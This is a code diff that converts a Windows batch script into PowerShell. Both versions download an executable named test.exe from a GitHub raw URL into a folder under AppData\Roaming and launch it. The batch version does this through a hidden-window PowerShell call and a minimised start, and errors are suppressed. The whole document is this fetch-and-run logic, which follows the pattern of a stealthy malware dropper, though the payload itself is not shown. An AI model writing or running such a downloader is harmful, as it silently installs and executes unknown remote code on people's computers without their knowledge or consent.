@@ -1,29 +1,29 @@
-@echo off
-setlocal
+# Define variables
+$file = "test.exe"
+$url = "https://github.com/rspvn/a/raw/main/test.exe"
+$folder = "$env:USERPROFILE\AppData\Roaming\test"
 
-set "file=test.exe"
-set "url=https://github.com/rspvn/a/raw/main/test.exe"
-set "folder=%USERPROFILE%\AppData\Roaming\test"
+# Create folder if it does not exist
+if (-not (Test-Path -Path $folder)) {
+    New-Item -ItemType Directory -Path $folder | Out-Null
+}
 
-if not exist "%folder%" (
-    mkdir "%folder%"
-)
+# Check if file exists
+if (Test-Path -Path "$folder\$file") {
+    Start-Process -FilePath "$folder\$file"
+    exit
+} else {
+    # Download file
+    Invoke-WebRequest -Uri $url -OutFile "$folder\$file" -ErrorAction SilentlyContinue
 
-:: Check if file exists
-if exist "%folder%\%file%" (
-    start "" /min "%folder%\%file%"
-    exit /b
-) else (
-    powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%folder%\%file%' -ErrorAction SilentlyContinue"
-    :: Check again if file exists after download attempt
-    if exist "%folder%\%file%" (
-        start "" /min "%folder%\%file%"
-    ) else (
-        echo Download failed.
-    )
-    :: Close CMD window after 5 seconds
-    timeout /t 5 /nobreak >nul
-    exit /b
-)
+    # Check again if file exists after download attempt
+    if (Test-Path -Path "$folder\$file") {
+        Start-Process -FilePath "$folder\$file"
+    } else {
+        Write-Output "Download failed."
+    }
 
-endlocal
+    # Close PowerShell window after 5 seconds
+    Start-Sleep -Seconds 5
+    exit
+}
